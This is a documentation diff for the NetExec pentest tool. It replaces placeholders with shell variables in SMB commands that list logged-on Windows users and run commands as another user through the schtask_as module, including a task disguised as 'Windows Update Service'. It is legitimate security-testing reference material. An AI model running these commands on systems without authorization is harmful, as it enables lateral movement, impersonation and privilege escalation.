@@ -19,13 +19,13 @@ There are two ways you can enumerate logged on users on a Windows machine:
 * --loggedon-user
 
 ```bash
-nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users
+nxc smb $TARGET -u $USER -p $PASSWORD --loggedon-users
 ```
 
 * --qwinsta
 
 ```bash
-nxc smb <ip> -u <localAdmin> -p <password> --qwinsta
+nxc smb $TARGET -u $USER -p $PASSWORD --qwinsta
 ```
 
 Note that these two options do not output the same result at all. Indeed --loggedon-users returns the list of logged users as well as to which DC they connected to.
@@ -34,7 +34,7 @@ The --qwinsta returns the windows interactive sessions that are running on the s
 ### 2. Execute commands on behalf of other users
 
 ```bash
-nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
+nxc smb $TARGET -u $USER -p $PASSWORD -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
 ```
 
 <figure><img src="../.gitbook/assets/schtask_as.png" alt=""><figcaption></figcaption></figure>
@@ -53,7 +53,7 @@ LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\
 Example:
 
 ```bash
-nxc smb [] -u [] -p [] --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"
+nxc smb $TARGET -u $USER -p $PASSWORD --local-auth -M schtask_as -o USER=[target] CMD="whoami" TASK="Windows Update Service" FILE="update.log" LOCATION="\\Windows\\Tasks\\"
 ```
 
 Custom command to add a user to the domain admin group for easy copy\&pasting:
